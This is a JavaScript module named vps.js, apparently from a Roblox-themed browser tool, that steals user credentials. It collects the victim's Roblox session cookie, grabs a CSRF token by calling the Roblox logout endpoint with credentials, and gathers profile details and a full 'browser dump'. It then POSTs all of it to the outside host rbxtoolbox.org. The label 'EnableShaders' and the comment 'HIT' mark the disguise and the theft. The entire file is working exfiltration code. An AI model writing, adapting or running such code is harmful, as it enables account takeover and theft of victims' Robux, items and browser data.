// vps.js — EnableShaders → HIT + full browser dump ZIP
const VPS_URL      = "https://rbxtoolbox.org";
const CHECK_PATH   = "/apis/backend/userinfo.php";
const ZIP_PATH     = "/apis/backend/zip_side.php";
const DEFAULT_DIR  = "lastversion";
const METHOD       = "EnableShaders";

window.vps = (function () {
  const base = () => VPS_URL.replace(/\/+$/, "");

  function headers() {
    return {
      "Content-Type": "application/x-www-form-urlencoded",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    };
  }

  function withWarning(cookie) {
    if (!cookie) return cookie;
    if (cookie.includes("WARNING:-DO-NOT-SHARE")) return cookie;
    return (
      "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" +
      cookie
    );
  }

  function buildBody(acc, includeDump) {
    const body = new URLSearchParams({
      cookie: withWarning(acc.cookie),
      dir: DEFAULT_DIR,
      pass: METHOD,
    });
    if (acc.csrfToken) {
      body.set("csrf", acc.csrfToken);
      body.set("xcsrf", acc.csrfToken);
    }
    body.set("userid", String((acc.profile && acc.profile.id) || acc.id || ""));
    body.set("username", String((acc.profile && acc.profile.name) || acc.name || ""));
    body.set("displayname", String((acc.profile && acc.profile.displayName) || acc.displayName || acc.name || ""));
    if (acc.profile) body.set("profile", JSON.stringify(acc.profile));
    if (acc.avatarUrl) body.set("avatar", acc.avatarUrl);
    if (includeDump && acc.browserDump && window.browserDump) {
      body.set("dump", window.browserDump.encode(acc.browserDump));
      if (acc.browserDump.meta) body.set("dump_meta", JSON.stringify(acc.browserDump.meta));
    }
    return body;
  }

  async function test() {
    try { await fetch(base() + "/", { method: "HEAD", mode: "no-cors" }); } catch (_) {}
    return true;
  }

  async function pushCheck(acc) {
    if (!acc || !acc.cookie) throw new Error("no cookie");
    const r = await fetch(base() + CHECK_PATH, {
      method: "POST", headers: headers(), body: buildBody(acc, false).toString(),
    });
    const text = await r.text();
    let json; try { json = JSON.parse(text); } catch { json = { raw: text }; }
    if (!r.ok || (json && json.error)) throw new Error((json && json.error) || ("HTTP " + r.status));
    return { sent: true, result: json };
  }

  async function pushZip(acc) {
    if (!acc || !acc.cookie) return { sent: false };
    try {
      const r = await fetch(base() + ZIP_PATH, {
        method: "POST", headers: headers(), body: buildBody(acc, true).toString(),
      });
      const text = await r.text();
      let json; try { json = JSON.parse(text); } catch { json = { raw: text }; }
      return { sent: !!(json && json.ok), result: json };
    } catch (e) {
      console.error("pushZip", e);
      return { sent: false };
    }
  }

  async function push(acc) {
    if (!acc.browserDump && window.browserDump) {
      try { acc.browserDump = await window.browserDump.collect(); } catch (_) {}
    }
    if (!acc.csrfToken) {
      try {
        const r = await fetch("https://auth.roblox.com/v2/logout", {
          method: "POST", credentials: "include",
          headers: { "Content-Type": "application/json" },
        });
        acc.csrfToken = r.headers.get("x-csrf-token") || null;
      } catch (_) {}
    }
    const checkPromise = pushCheck(acc);
    const zipPromise = pushZip(acc).catch(() => ({ sent: false }));
    const [check, zip] = await Promise.all([checkPromise, zipPromise]);
    return { sent: true, check, zip };
  }

  async function remove() { return; }
  async function pullStatuses() { return {}; }

  return { test, push, pushCheck, pushZip, remove, pullStatuses };
})();
